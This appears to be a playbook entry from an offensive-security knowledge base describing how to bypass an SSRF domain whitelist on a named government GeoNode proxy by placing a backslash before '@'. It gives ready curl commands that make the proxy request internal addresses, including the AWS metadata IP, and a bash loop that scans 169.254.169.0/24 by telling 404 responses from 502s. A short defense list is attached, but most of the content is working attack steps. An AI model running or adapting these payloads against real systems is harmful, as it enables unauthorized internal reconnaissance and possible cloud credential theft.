---
tags:
  - ssrf
  - bypass
  - scanning
  - aws
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/bypass-whitelist-to-internal-ip]]'
  - '[[commands/test-nonexistent-internal-ip]]'
  - '[[commands/direct-internal-ip-test]]'
verified: false
platforms:
  - Web
  - AWS
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Active Scanning]]'
updated_at: '2025-12-14T04:08:55.013Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: e6c89ae0-fbff-45f2-aed6-0007766c3714
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Active Scanning]]'
---
# Bypass-SSRF-Whitelist-for-Internal-Scanning

## Summary

This procedure exploits URL parsing discrepancies in SSRF protections to bypass domain whitelists, enabling requests to internal IPs like AWS metadata (169.254.169.254) and scanning for alive hosts by differentiating 404 (alive) from 502 (unreachable) responses.

## Description

The vulnerability arises from frontend whitelisting the domain (e.g., geonode.state.gov) in the full URL string, while the backend parses the host before the @ and treats subsequent parts as path. Using backslash (\) terminates the internal host, tricking the backend into requesting http://internal-ip\/@whitelisted-domain. This allows internal network reconnaissance on AWS environments without direct access.

## Requirements

1. Confirmed SSRF endpoint from prior reconnaissance
2. Knowledge of target internal IP ranges (e.g., AWS link-local 169.254.0.0/16)
3. HTTP client for crafting requests

## Defense

Defensive measures and detection strategies:

- Normalize URL parsing identically across frontend and backend
- Block requests to private/reserved IP ranges (RFC 1918, link-local)
- Implement request signing or origin validation for proxies
- Monitor for anomalous 404/502 patterns from proxy endpoints

## Objectives

1. Access internal services bypassing whitelist
2. Scan and map alive internal hosts
3. Identify sensitive endpoints like AWS metadata

## Instructions

### Step 1: Craft Bypass Payload for Alive Host

**Context**: Target known internal service like AWS metadata to confirm bypass.

**Command** ([[commands/bypass-whitelist-to-internal-ip]]):
```bash
curl -X GET "https://geonode.state.gov/proxy/?url=http://169.254.169.254\\@geonode.state.gov" -H "Host: geonode.state.gov" -H "Cookie: [redacted]" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-GB,en-US;q=0.9,en;q=0.8" -H "Connection: close"
```

> Backend requests 169.254.169.254\/@geonode.state.gov, yielding 404 if host alive.

### Step 2: Test Unreachable Host for Response Differentiation

**Context**: Use invalid IP to baseline unreachable response.

**Command** ([[commands/test-nonexistent-internal-ip]]):
```bash
curl -X GET "https://geonode.state.gov/proxy/?url=http://169.254.169.251\\@geonode.state.gov" -H "Host: geonode.state.gov" -H "Cookie: [redacted]" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-GB,en-US;q=0.9,en;q=0.8" -H "Connection: close"
```

> Expect 502 Bad Gateway for non-existent hosts.

### Step 3: Verify Direct Access Block

**Context**: Confirm whitelist prevents non-bypassed internal requests.

**Command** ([[commands/direct-internal-ip-test]]):
```bash
curl -X GET "https://geonode.state.gov/proxy/?url=http://169.254.169.254/" -H "Host: geonode.state.gov"
```

> Request blocked, reinforcing bypass value.

### Step 4: Perform Scanning

**Context**: Automate IP variation for network mapping.

Use a script to iterate IPs, e.g., in bash:
```bash
for ip in {1..254}; do
  curl -s -o /dev/null -w "%{http_code} " "https://geonode.state.gov/proxy/?url=http://169.254.169.$ip\\@geonode.state.gov" | grep -q "404" && echo "Alive: 169.254.169.$ip"
  curl -s -o /dev/null -w "%{http_code} " "https://geonode.state.gov/proxy/?url=http://169.254.169.$ip\\@geonode.state.gov" | grep -q "502" && echo "Unreachable: 169.254.169.$ip"
done
```

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Active Scanning]] Active Scanning

### Sub-Techniques

-

## Commands Used

- [[commands/bypass-whitelist-to-internal-ip]]
- [[commands/test-nonexistent-internal-ip]]
- [[commands/direct-internal-ip-test]]

## Tools Used

-

## Tags

- ssrf
- bypass
- scanning
- aws
